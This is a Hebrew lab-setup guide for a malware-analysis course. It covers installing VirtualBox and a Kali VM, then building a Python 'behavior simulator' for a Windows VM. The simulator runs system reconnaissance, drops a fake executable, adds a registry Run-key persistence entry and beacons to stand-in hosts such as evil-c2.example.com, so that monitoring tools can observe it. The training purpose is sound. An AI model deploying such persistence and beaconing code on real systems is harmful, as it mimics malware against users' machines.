חלק 1 — התקנת VirtualBox (כל מערכת הפעלה)

  1. 1.1 הורד installer
    https://www.virtualbox.org/wiki/Downloads
בחר:  Windows hosts  /  macOS / Intel hosts  /  Linux distributions

חלק 2 — יצירת Kali Linux VM (מעבדות 1, 4, 5)

  1. 2.1 הורד Kali VM מוכן
    https://www.kali.org/get-kali/#kali-virtual-machines
→ לחץ על טאב "VirtualBox"
→ לחץ "64-bit"  (~3 GB קובץ .7z)
→ המתן לסיום ההורדה
    מוכן מראש = אין צורך בהתקנה. ה-.7z מכיל דיסק VM מוכן.
  2. 2.2 חלץ את ה-.7z
    Windows: התקן 7-Zip מ-7-zip.org, לחיצה ימנית על .7z → 7-Zip → Extract Here
macOS:   התקן Keka מ-keka.io, לחיצה כפולה על ה-.7z
Linux:   sudo apt install p7zip-full; 7z x kali-linux-*.7z
תוצאה:   תיקייה עם  kali-linux-*.vbox  +  .vdi
  3. 2.3 ייבוא ל-VirtualBox
    1. פתח VirtualBox
2. תפריט: Machine → Add  (או Ctrl+A)
3. נווט לתיקייה שחילצת
4. בחר את קובץ ה-.vbox → Open
5. ה-VM מופיע ברשימה השמאלית כ-"kali-linux-..."
  4. 2.4 כוונון משאבי VM (מארח חלש)
    לחיצה ימנית על ה-VM → Settings:

System → Motherboard tab:    Base Memory = 4096 MB  (או 3072 אם המארח חלש)
System → Processor tab:      CPUs = 2
Display → Screen tab:        Video Memory = 64 MB ; בטל 3D Acceleration
Audio:                       בטל "Enable Audio"
USB:                         בחר USB 1.1 (לא 3.0)
Network → Adapter 1:         Attached to: NAT  (מאפשר אינטרנט ל-VirusTotal)

לחץ OK
  5. 2.5 הפעלה ראשונה
    לחיצה כפולה על Kali VM → המתן לטעינת שולחן העבודה
משתמש: kali
סיסמה: kali
פתח Terminal (אייקון בפינה שמאל-עליון)
הרץ:  whoami    →  אמור להציג: kali
הרץ:  sudo -v   →  הכנס "kali" → אין שגיאה = sudo עובד
    שולחן העבודה של Kali נטען. Terminal נפתח. sudo apt update מצליח.
  6. 2.6 צילום snapshot של מצב נקי
    בחלון VirtualBox של ה-VM: Machine → Take Snapshot
שם: "clean-kali"
תיאור: "Kali טרי, sudo עובד"
→ OK
    Snapshot = נקודת שמירה. אם משהו נשבר, שחזור תוך 5 שניות.

בנה את Behavior Simulator בעצמך

# בתוך Win10 VM (PowerShell כאדמין):
# השתמש שוב ב-Python ממעבדה 2 אם הותקן.
mkdir C:\Tools\behavior-sim 2>$null
@'
import os, socket, time, urllib.request, subprocess, winreg, sys

# Recon
subprocess.run(["systeminfo"], capture_output=True)
subprocess.run(["whoami","/all"], capture_output=True)
subprocess.run(["net","user"], capture_output=True)

# File drop
drop = os.path.expandvars(r"%APPDATA%\sim_payload.tmp")
open(drop,"wb").write(b"\x4D\x5A" + b"\x00"*1022)

# Persistence
k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
    r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
winreg.SetValueEx(k, "BehaviorSim", 0, winreg.REG_SZ, sys.executable + " " + __file__)
winreg.CloseKey(k)

# DNS + HTTP מזויפים (FakeNet יתפוס)
for host in ["evil-c2.example.com","data-exfil.example.com","update-srv.example.com"]:
    try:
        socket.gethostbyname(host)
        urllib.request.urlopen(f"http://{host}/beacon", timeout=2).read()
    except: pass

time.sleep(30)
'@ | Out-File -Encoding ASCII C:\Tools\behavior-sim\behavior-sim.py

cd C:\Tools\behavior-sim
python -m PyInstaller --onefile behavior-sim.py
copy dist\behavior-sim.exe C:\Tools\behavior-sim.exe
C:\Tools\behavior-sim.exe קיים. בהפעלה עם FakeNet פעיל, ProcMon מתעד file drops ב-%APPDATA%, כתיבות registry ל-HKCU Run, ו-FakeNet מתעד שאילתות DNS ל-evil-c2/data-exfil/update-srv.

במקום Regshot — אפשר להשתמש ב-Autoruns לפני ואחרי הרצה (Compare). היתרון: גם persistence מסוגי scheduled tasks, services, drivers — לא רק Run keys.
